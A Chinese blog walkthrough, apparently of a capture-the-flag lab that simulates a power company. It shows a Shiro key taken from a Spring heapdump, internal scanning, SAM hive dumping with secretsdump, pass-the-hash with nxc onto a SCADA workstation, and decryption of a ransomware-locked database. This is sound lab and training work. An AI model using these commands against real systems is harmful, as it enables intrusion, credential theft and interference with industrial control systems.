---
layout: post
title: ThermalPower - 春秋云境
category: [春秋云境]
tags: [shiro, heapdump, SCADA]
---

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/c5c26451df96d327.png)

靶标介绍：

该场景模拟仿真了电力生产企业的部分业务场景。“火创能源” 公司在未充分重视网络安全的威胁的情况下，将敏感区域的服务错误地配置在公网上，使得外部的 APT 组织可以轻松地访问这些服务，最终导致控制电力分配、生产流程和其他关键设备的服务遭受攻击，并部署了勒索病毒。 玩家的任务是分析 APT 组织的渗透行为，按照关卡列表恢复其攻击路径，并对勒索病毒加密的文件进行解密。 附件地址：https://pan.baidu.com/s/13jTP6jWi6tLWkbyO8SQSnQ?pwd=kj6h

| 内网地址      | Host or FQDN | 简要描述              |
| ------------- | ------------ | --------------------- |
| 172.22.17.213 | security     | spring + shiro        |
| 172.22.17.6   | WIN-ENGINEER | SCADA 工程师的个人 PC |
| 172.22.26.11  | WIN-SCADA    | SCADA 工程师站        |

## 第一关 | Spring Heapdump + Shiro Deserialization

关卡剧情：
评估暴露在公网的服务的安全性，尝试建立通向生产区的立足点。

---

8080 端口存在 shiro 特征：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/374dbaf030f44236.png)

下载 `/actuator/heapdump` 文件并使用 [whwlsfb/JDumpSpider](https://github.com/whwlsfb/JDumpSpider) 分析 heapdump 文件，获取到 Shiro 的 Key：

```
root@kali-server:~# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump

===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = CBC, key = QZYysgMYhG6/CzIJlVpR2g==, algName = AES
```

Shiro 反序列化利用：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/45e4cf71acc0c8df.png)

获取 flag01：

```
root@security:~# cat /flag01.txt
   ████  ██                    ████   ██
  ░██░  ░██            █████  █░░░██ ███
 ██████ ░██  ██████   ██░░░██░█  █░█░░██
░░░██░  ░██ ░░░░░░██ ░██  ░██░█ █ ░█ ░██
  ░██   ░██  ███████ ░░██████░██  ░█ ░██
  ░██   ░██ ██░░░░██  ░░░░░██░█   ░█ ░██
  ░██   ███░░████████  █████ ░ ████  ████
  ░░   ░░░  ░░░░░░░░  ░░░░░   ░░░░  ░░░░


flag01: flag{78cdaa8f-db36-4c9c-b9e9-c1622ff180c4}
```

获取网段信息：

```
root@security:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:0f:bf:fc brd ff:ff:ff:ff:ff:ff
    inet 172.22.17.213/16 brd 172.22.255.255 scope global dynamic eth0
       valid_lft 315357804sec preferred_lft 315357804sec
    inet6 fe80::216:3eff:fe0f:bffc/64 scope link
       valid_lft forever preferred_lft forever
```

使用 fscan 扫描内网：

```
root@security:/# ./fscan -h 172.22.17.213/16 -hn 172.22.17.213

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.3
start infoscan
(icmp) Target 172.22.17.6     is alive
(icmp) Target 172.22.255.253  is alive
(icmp) Target 172.22.26.11    is alive
[*] LiveTop 172.22.0.0/16    段存活数量为: 3
[*] LiveTop 172.22.17.0/24   段存活数量为: 1
[*] LiveTop 172.22.255.0/24  段存活数量为: 1
[*] LiveTop 172.22.26.0/24   段存活数量为: 1
[*] Icmp alive hosts len is: 3
172.22.26.11:445 open
172.22.17.6:445 open
172.22.26.11:139 open
172.22.17.6:139 open
172.22.26.11:135 open
172.22.17.6:135 open
172.22.26.11:80 open
172.22.17.6:80 open
172.22.17.6:21 open
172.22.26.11:1433 open
[*] alive ports len is: 10
start vulscan
[*] NetInfo
[*]172.22.26.11
   [->]WIN-SCADA
   [->]172.22.26.11
[*] NetBios 172.22.26.11    WORKGROUP\WIN-SCADA
[*] NetBios 172.22.17.6     WORKGROUP\WIN-ENGINEER
[*] NetInfo
[*]172.22.17.6
   [->]WIN-ENGINEER
   [->]172.22.17.6
[*] WebTitle http://172.22.26.11       code:200 len:703    title:IIS Windows Server
[+] mssql 172.22.26.11:1433:sa 123456
[*] WebTitle http://172.22.17.6        code:200 len:661    title:172.22.17.6 - /
[+] ftp 172.22.17.6:21:anonymous
   [->]Modbus
   [->]PLC
   [->]web.config
   [->]WinCC
   [->]内部软件
   [->]火创能源内部资料
已完成 10/10
[*] 扫描结束,耗时: 10.495400741s
```

存在 ftp 匿名访问，直接访问主机 80 端口也可以访问到这些敏感资源：[http://172.22.17.6/火创能源内部资料/](http://172.22.17.6/火创能源内部资料/)

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/c49b0150f75a707c.png)

## 第二关 | 员工信息

关卡剧情：
尝试接管 SCADA 工程师的个人 PC，并通过滥用 Windows 特权组提升至系统权限。

---

从“内部员工通讯录.xlsx”中获取到员工信息：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/996a54e4b4f1a38e.png)

从“火创能源内部通知.docx”中获取到默认密码规则：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/275b4ecea6a42475.png)

职位为“SCADA 工程师”的人员账号密码都能 RDP 登录：

```
PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.17.6 -u chenhua -p 'chenhua@0813'
SMB         172.22.17.6     445    WIN-ENGINEER     [*] Windows 10.0 Build 20348 x64 (name:WIN-ENGINEER) (domain:WIN-ENGINEER) (signing:False) (SMBv1:False)
SMB         172.22.17.6     445    WIN-ENGINEER     [+] WIN-ENGINEER\chenhua:chenhua@0813
```

并且都属于 Backup Operators 组成员：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/3d3b041318744519.png)

拥有特权：

```
PS C:\Windows\system32> whoami
win-engineer\chenhua
PS C:\Windows\system32> whoami /priv

特权信息
----------------------

特权名                        描述           状态
============================= ============== ======
SeBackupPrivilege             备份文件和目录 已禁用
SeRestorePrivilege            还原文件和目录 已禁用
SeShutdownPrivilege           关闭系统       已禁用
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用

```

转储 sam&system 注册表：

```
PS C:\Users\chenhua\Desktop> reg save hklm\sam sam.hive
操作成功完成。
PS C:\Users\chenhua\Desktop> reg save hklm\system system.hive
操作成功完成。
```

使用 impacket-secretsdump 从注册表转储文件中获取 ntlm 哈希：

```
└─# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x6c2be46aaccdf65a9b7be2941d6e7759
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f82292b7ac79b05d5b0e3d302bd0d279:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a2fa2853651307ab9936cc95c0e0acf5:::
chentao:1000:aad3b435b51404eeaad3b435b51404ee:47466010c82da0b75328192959da3658:::
zhaoli:1001:aad3b435b51404eeaad3b435b51404ee:2b83822caab67ef07b614d05fd72e215:::
wangning:1002:aad3b435b51404eeaad3b435b51404ee:3c52d89c176321511ec686d6c05770e3:::
zhangling:1003:aad3b435b51404eeaad3b435b51404ee:8349a4c5dd1bdcbc5a14333dd13d9f81:::
zhangying:1004:aad3b435b51404eeaad3b435b51404ee:8497fa5480a163cb7817f23a8525be7d:::
lilong:1005:aad3b435b51404eeaad3b435b51404ee:c3612c48cf829d1149f7a4e3ef4acb8a:::
liyumei:1006:aad3b435b51404eeaad3b435b51404ee:63ddcde0fa219c75e48e2cba6ea8c471:::
wangzhiqiang:1007:aad3b435b51404eeaad3b435b51404ee:5a661f54da156dc93a5b546ea143ea07:::
zhouyong:1008:aad3b435b51404eeaad3b435b51404ee:5d49bf647380720b9f6a15dbc3ffe432:::
chenhua:1009:aad3b435b51404eeaad3b435b51404ee:07ff24422b538b97f3c297cc8ddc7615:::
[*] Cleaning up...
```

使用管理员哈希 PTH：

```
PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.17.6 -u Administrator -H f82292b7ac79b05d5b0e3d302bd0d279
SMB         172.22.17.6     445    WIN-ENGINEER     [*] Windows 10.0 Build 20348 x64 (name:WIN-ENGINEER) (domain:WIN-ENGINEER) (signing:False) (SMBv1:False)
SMB         172.22.17.6     445    WIN-ENGINEER     [+] WIN-ENGINEER\Administrator:f82292b7ac79b05d5b0e3d302bd0d279 (Pwn3d!)

PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.17.6 -u Administrator -H f82292b7ac79b05d5b0e3d302bd0d279 -X 'type ~/flag/flag02.txt'
SMB         172.22.17.6     445    WIN-ENGINEER     [*] Windows 10.0 Build 20348 x64 (name:WIN-ENGINEER) (domain:WIN-ENGINEER) (signing:False) (SMBv1:False)
SMB         172.22.17.6     445    WIN-ENGINEER     [+] WIN-ENGINEER\Administrator:f82292b7ac79b05d5b0e3d302bd0d279 (Pwn3d!)
SMB         172.22.17.6     445    WIN-ENGINEER     [+] Executed command via wmiexec
SMB         172.22.17.6     445    WIN-ENGINEER     _____.__                 _______   ________
SMB         172.22.17.6     445    WIN-ENGINEER     _/ ____\  | _____     ____ \   _  \  \_____  \
SMB         172.22.17.6     445    WIN-ENGINEER     \   __\|  | \__  \   / ___\/  /_\  \  /  ____/
SMB         172.22.17.6     445    WIN-ENGINEER     |  |  |  |__/ __ \_/ /_/  >  \_/   \/       \
SMB         172.22.17.6     445    WIN-ENGINEER     |__|  |____(____  /\___  / \_____  /\_______ \
SMB         172.22.17.6     445    WIN-ENGINEER     \//_____/        \/         \/
SMB         172.22.17.6     445    WIN-ENGINEER
SMB         172.22.17.6     445    WIN-ENGINEER
SMB         172.22.17.6     445    WIN-ENGINEER     flag02: flag{cd0f626c-d89d-4d86-8a34-c05fabce7b51}
```

## 第三关 | SCADA.txt

关卡剧情：
尝试接管 SCADA 工程师站，并启动锅炉。

---

从“SCADA.txt”中获取到管理员凭据：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/9dc127dfc2cd9640.png)

直接使用管理员凭据进行横向：

```
PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.26.0/24 -u Administrator -p IYnT3GyCiy3
SMB         172.22.26.11    445    WIN-SCADA        [*] Windows 10.0 Build 20348 x64 (name:WIN-SCADA) (domain:WIN-SCADA) (signing:False) (SMBv1:False)
SMB         172.22.26.11    445    WIN-SCADA        [+] WIN-SCADA\Administrator:IYnT3GyCiy3 (Pwn3d!)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

登录 SCADA 工程师站，并启动锅炉，获取到 flag：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/bb967ec3a601d3ba.png)

flag：

```
flag{bcd080d5-2cf1-4095-ac15-fa4bef9ca1c0}
```

## 第四关 | 勒索病毒解密

关卡剧情：
尝试获取 SCADA 工程师站中的数据库备份，并分析备份文件是否泄漏了敏感数据。

---

> 注：先让远程桌面全屏，然后使用 Win + D 快捷键回到桌面。

主机中的文件被勒索病毒加密了：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/ec51a7d2d4a68cd9.png)

在桌面中查看到一个被加密的文件 `ScadaDB.sql.locky` 和勒索信息。

在 C 盘找到勒索病毒程序 Lockyou.exe：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/c852fd9f65518362.png)

使用 dnSpy 分析程序，该程序使用了 AES 加密文件：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/92b730c78a483c67.png)

从指定的服务器上获取了 encryptedAesKey 和 privateKey 文件内容，赋值给变量 AES_KEY_ENC 和 PRIVATE_KEY。

解密密钥 AES_KEY 为 DecryptRSA 函数对 AES_KEY_ENC 和 PRIVATE_KEY 变量进行处理获得：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/efdaa161c06d861b.png)

> 注：题目的网盘附件中有给我们 encryptedAesKey 和 privateKey 文件。

直接在 PowerShell 中使用如下命令对 ScadaDB.sql.locky 文件进行 AES 解密：

```powershell
Add-Type -TypeDefinition @"
    using System;
    using System.IO;
    using System.Security.Cryptography;
    using System.Text;

    public class CryptoHelper {

        public void DecryptAES(string inputFile, string outputFile, string encryptedAesKey, string privateKey) {
            // 获取 AES 密钥
            byte[] AES_KEY = DecryptRSA(encryptedAesKey, privateKey);

            // 使用 AES 密钥来解密文件
            using (Aes aesAlg = Aes.Create()) {
                aesAlg.Key = AES_KEY;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.None;
                aesAlg.IV = new byte[16];

                using (FileStream fsDecrypt = new FileStream(outputFile, FileMode.Create)) {
                    using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV)) {
                        using (FileStream fsEncrypted = new FileStream(inputFile, FileMode.Open)) {
                            using (CryptoStream csDecrypt = new CryptoStream(fsEncrypted, decryptor, CryptoStreamMode.Read)) {
                                csDecrypt.CopyTo(fsDecrypt);
                            }
                        }
                    }
                }
            }
        }

        public byte[] DecryptRSA(string encryptedData, string privateKey)
          {
           byte[] result;
           using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
           {
            rsacryptoServiceProvider.FromXmlString(privateKey);
            byte[] rgb = Convert.FromBase64String(encryptedData);
            result = rsacryptoServiceProvider.Decrypt(rgb, false);
           }
           return result;
          }
    }
"@

$cryptoHelper = New-Object CryptoHelper
$cryptoHelper.DecryptAES("./ScadaDB.sql.locky", "./ScadaDB_new.sql", "lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=", "<RSAKeyValue><Modulus>uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=</Modulus><Exponent>AQAB</Exponent><P>2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==</P><Q>2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==</Q><DP>ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==</DP><DQ>PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==</DQ><InverseQ>JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==</InverseQ><D>tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=</D></RSAKeyValue>")
```

在解密的 sql 文件中获取到 flag04：

```
-- ----------------------------
-- Records of flag04
-- ----------------------------
INSERT INTO [dbo].[flag04] ([id], [flag]) VALUES (N'1', N'flag{63cd8cd5-151f-4f29-bdc7-f80312888158}')
GO
```
